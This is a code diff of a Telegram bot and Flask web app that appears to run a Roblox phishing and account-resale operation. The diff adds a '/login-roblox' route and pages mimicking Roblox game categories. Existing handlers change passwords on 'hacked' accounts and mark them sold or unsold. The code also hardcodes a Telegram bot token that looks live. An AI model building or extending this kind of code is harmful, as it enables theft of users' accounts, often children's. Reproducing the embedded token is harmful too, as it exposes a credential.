@@ -1,5 +1,5 @@
 # Импорт библиотек
-from flask import Flask, request, abort
+from flask import Flask, request, abort, render_template
 import telebot
 from telebot import types
 import psycopg2
@@ -30,7 +30,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Инициализация Flask
-app = Flask(__name__)
+app = Flask(__name__, template_folder='templates')
 
 # Конфигурация
 TOKEN = '8028944732:AAFsvb4csGSRwtmEFYLGbnTKsCq1hOH6rm0'
@@ -356,14 +356,51 @@ def check_bot_status():
         logger.error(f"Бот не отвечает: {e}")
         return False
 
-# Главная страница
+# Flask маршруты для HTML страниц
 @app.route('/')
 def index():
     logger.info("Запрос на /")
-    if check_bot_status():
-        return "Bot is running!", 200
-    logger.error("Бот не отвечает")
-    return "Bot is down!", 500
+    return render_template('index.html')
+
+@app.route('/404')
+def not_found():
+    logger.info("Запрос на /404")
+    return render_template('404.html')
+
+@app.route('/toptrending')
+def top_trending():
+    logger.info("Запрос на /toptrending")
+    return render_template('toptrending.html')
+
+@app.route('/login-roblox')
+def login_roblox():
+    logger.info("Запрос на /login-roblox")
+    return render_template('login-roblox.html')
+
+@app.route('/index')
+def index_explicit():
+    logger.info("Запрос на /index")
+    return render_template('index.html')
+
+@app.route('/upandcoming')
+def up_and_coming():
+    logger.info("Запрос на /upandcoming")
+    return render_template('upandcoming.html')
+
+@app.route('/funwithfriends')
+def fun_with_friends():
+    logger.info("Запрос на /funwithfriends")
+    return render_template('funwithfriends.html')
+
+@app.route('/hotrightnow')
+def hot_right_now():
+    logger.info("Запрос на /hotrightnow")
+    return render_template('hotrightnow.html')
+
+@app.route('/toprevisted')
+def top_revisited():
+    logger.info("Запрос на /toprevisted")
+    return render_template('toprevisted.html')
 
 # Вебхук
 @app.route('/webhook', methods=['POST'])
@@ -579,10 +616,7 @@ def site_cmd(message):
         except Exception as e:
             logger.error(f"Ошибка /site: {e}")
         return
-    response = (
-        "🌐 *Наш официальный сайт*\n"
-        "Связь и дополнительная информация: [@sacoectasy](https://t.me/sacoectasy)"
-    )
+    response = "🌐 *Наш официальный сайт*: https://tg-bod.onrender.com"
     try:
         bot.reply_to(message, response, parse_mode='Markdown')
         logger.info(f"Ответ: {response}")
@@ -790,7 +824,7 @@ def process_hacked_password(message, login, old_password):
         return
     keyboard = types.InlineKeyboardMarkup()
     keyboard.add(
-        types.InlineKeyboardButton("✅ Прод", callback_data=f"hacked_status_sold_{login}_{new_password}"),
+        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_status_sold_{login}_{new_password}"),
         types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_status_not_sold_{login}_{new_password}")
     )
     try:
@@ -1289,7 +1323,7 @@ def adduser_cmd(message):
             parse_mode='Markdown'
         )
         bot.register_next_step_handler(msg, process_add_user)
-        logger.info(f"Запрошен пользователь")
+        logger.info(f"Запрошено добавление пользователя")
     except Exception as e:
         logger.error(f"Ошибка /adduser: {e}")
         bot.reply_to(message, "❌ *Ошибка запроса!*", parse_mode='Markdown')
@@ -1714,17 +1748,8 @@ if __name__ == '__main__':
         webhook_url = f'{SITE_URL}/webhook'
         logger.info(f"Установка вебхука: {webhook_url}")
         bot.set_webhook(url=webhook_url, secret_token=SECRET_WEBHOOK_TOKEN)
-        logger.info(f"Вебхук: {SECRET_WEBHOOK_TOKEN}")
+        logger.info("Вебхук установлен")
+        app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
     except Exception as e:
-        logger.error(f"Ошибка вебхука: {e}")
-        raise
-    try:
-        logger.info("Запуск Flask")
-        app.run(
-            host='0.0.0.0',
-            port=int(os.getenv('PORT', 10000)),
-            debug=False
-        )
-    except Exception as e:
-        logger.error(f"Ошибка сервера: {e}")
+        logger.error(f"Ошибка запуска: {e}")
         raise
